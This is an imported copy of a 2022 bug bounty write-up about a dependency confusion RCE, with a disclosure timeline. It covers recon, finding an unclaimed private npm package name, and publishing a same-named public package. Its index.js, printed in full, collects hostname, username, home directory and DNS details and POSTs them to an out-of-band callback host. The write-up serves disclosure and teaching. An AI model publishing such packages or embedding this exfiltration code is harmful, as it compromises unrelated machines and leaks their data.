---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-05-10_rce-via-dependency-confusion.md
original_filename: 2022-05-10_rce-via-dependency-confusion.md
title: RCE via Dependency Confusion
category: documents
detected_topics:
- supply-chain
- command-injection
- cloud-security
tags:
- imported
- documents
- supply-chain
- command-injection
- cloud-security
language: en
raw_sha256: 7ca54aaf700c1526a3887be5e41ab018f4512b9802778f905b02425ec21169a2
text_sha256: 9a5ab1da57d5b232a9df5d7b08a7ee77d9bff4d7d01dbc49cc55ff6b649ef435
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# RCE via Dependency Confusion

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-05-10_rce-via-dependency-confusion.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection, cloud-security
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `7ca54aaf700c1526a3887be5e41ab018f4512b9802778f905b02425ec21169a2`
- Text SHA256: `9a5ab1da57d5b232a9df5d7b08a7ee77d9bff4d7d01dbc49cc55ff6b649ef435`


## Content

---
title: "RCE via Dependency Confusion"
url: "https://systemweakness.com/rce-via-dependency-confusion-e0ed2a127013"
authors: ["Samrat Gupta (@Sm4rty_)"]
bugs: ["Dependency confusion"]
publication_date: "2022-05-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2651
scraped_via: "browseros"
---

# RCE via Dependency Confusion

Top highlight

RCE via Dependency Confusion
Sm4rty
Follow
4 min read
·
May 10, 2022

201

6

Press enter or click to view image in full size

Hey there, I am Samrat Gupta aka Sm4rty, a Security Researcher and a Bug Bounty Hunter. In this Blog I will be sharing my recent finding RCE via Dependency Confusion attack at Hackerone Private program.

This blog is about my methodology, How I found the bug and how I created POC and exploited the bug. If you want to dig further you can follow this awesome blog by Alex Brisan.

What is DEPENDENCY CONFUSION?

A Dependency Confusion attack or supply chain substitution attack occurs when a software installer script is tricked into pulling a malicious code file from a public repository instead of the intended file of the same name from an internal repository.

Flow of Dependency Confusion Attack

Press enter or click to view image in full size
From the above image, it can be observed that the Public Package contains Higher version compared to the Private package.
So if the package indexing is not properly done, it will automatically pull the Higher version package from the Public Registry.
How I found this Bug?

Lets call the website redacted.com, as It was a private program at Hackerone.

Shodan Dorking: I started with some shodan recon and using the below shodan dork, I found a IP that belongs to redacted.com.
Press enter or click to view image in full size

2. Directory Bruteforcing: Now, using directory bruteforcing tools like Dirsearch and FFUF, I found a package.json file. The package.json file contained all the packages which was installed in the server. The url looked like: https://XX.XX.XX.XX/ui/package.json

The content of the package.json file:

Press enter or click to view image in full size

3. Checking for Dependency Confusion in Private Packages: I downloaded the package.json file and started to check for private packages using a tool called Confused by visma-prodec.

Press enter or click to view image in full size

Now, I found that “spr-svg-loaders” package was not in npm public repository. You can verify the same by going to npm website and searching for the package name.

Press enter or click to view image in full size

The next step is to create the same NPM package name (spr-svg-loaders) , into the public NPM registry.

Get Sm4rty’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

4. Creating Malicious Packages (NPM):

Create a npm package with the package name and the following code as index.js and upload it to public npm repository. The full procedure for uploading the package can be found in this blog.

const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const trackingData = JSON.stringify({
  p: package,
  c: __dirname,
  hd: os.homedir(),
  hn: os.hostname(),
  un: os.userInfo().username,
  dns: dns.getServers(),
  r: packageJSON ? packageJSON.___resolved : undefined,
  v: packageJSON.version,
  pjson: packageJSON,
});

var postData = querystring.stringify({
  msg: trackingData,
});

var options = {
  hostname: "burpcollaborator.net", //replace burpcollaborator.net with Interactsh or pipedream
  port: 443,
  path: "/",
  method: "POST",
  headers: {
  "Content-Type": "application/x-www-form-urlencoded",
  "Content-Length": postData.length,
  },
};

var req = https.request(options, (res) => {
  res.on("data", (d) => {
  process.stdout.write(d);
  });
});

req.on("error", (e) => {
  // console.error(e);
});

req.write(postData);
req.end();

After publishing the package we can verify it by checking the package name at npm repository.

Press enter or click to view image in full size

Within few hours of uploading the packages, I received ping-back with few data like hostname, directory, ipaddress, username to my interact.sh server.

I received ping back not only from the server, which was hosted on aws, but also from few other Computers. So, I quickly exported the data and send it to the program.

Press enter or click to view image in full size

Bug Report Timeline:

Reported: 22/01/2022
Triaged: 09/02/2022
Fixed and SWAG Rewarded: 06/05/2022

Press enter or click to view image in full size
Credits:
Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies
The Story of a Novel Supply Chain Attack

medium.com

Dependency Confusion
Hello Everyone, I'm back with another blog related to the Dependency Confusion Bug that was discovered by Alex Birsan…

dhiyaneshgeek.github.io

Thanks for Reading. Any Suggestions are always welcomed!!

If you haven’t Subscribed yet, Please Do Subscribe. You can Buy me a coffee and Follow me on Twitter.

Press enter or click to view image in full size
